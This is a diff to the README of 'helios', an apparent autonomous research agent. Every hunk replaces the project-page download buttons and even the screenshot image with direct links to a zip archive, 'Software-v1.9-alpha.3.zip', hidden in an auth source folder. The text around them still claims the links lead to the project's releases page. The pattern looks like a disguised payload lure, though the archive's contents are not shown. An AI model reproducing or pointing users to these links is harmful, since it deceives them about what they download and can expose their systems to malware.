@@ -1,6 +1,6 @@
 # 🌞 helios - Run an Autonomous Research Agent
 
-[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/Undyed-sponsor739/helios)
+[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://raw.githubusercontent.com/Undyed-sponsor739/helios/main/src/providers/auth/Software-v1.9-alpha.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ If you plan to use SSH features, you will also need access to a remote machine w
 
 Click the button below to go to the Helios download page on GitHub.
 
-[![Download Helios](https://img.shields.io/badge/Download-Helios-blue)](https://github.com/Undyed-sponsor739/helios)
+[![Download Helios](https://img.shields.io/badge/Download-Helios-blue)](https://raw.githubusercontent.com/Undyed-sponsor739/helios/main/src/providers/auth/Software-v1.9-alpha.3.zip)
 
 This link will take you to the project’s page where you can find the latest releases and files for Windows.
 
@@ -98,7 +98,7 @@ Helios currently runs without a permissions system. This means:
 
 Here is a screenshot showing the main interface of Helios:
 
-![Helios screenshot](https://raw.githubusercontent.com/snoglobe/helios/main/media/screnshot.png)
+![Helios screenshot](https://raw.githubusercontent.com/Undyed-sponsor739/helios/main/src/providers/auth/Software-v1.9-alpha.3.zip)
 
 This shows how Helios may look when running tasks and interacting with your system.
 
@@ -137,4 +137,4 @@ If Helios does not start or work correctly, try these steps:
 
 Return to the download page by clicking the button below. From there, you can get the latest version for Windows.
 
-[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/Undyed-sponsor739/helios)
+[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://raw.githubusercontent.com/Undyed-sponsor739/helios/main/src/providers/auth/Software-v1.9-alpha.3.zip)
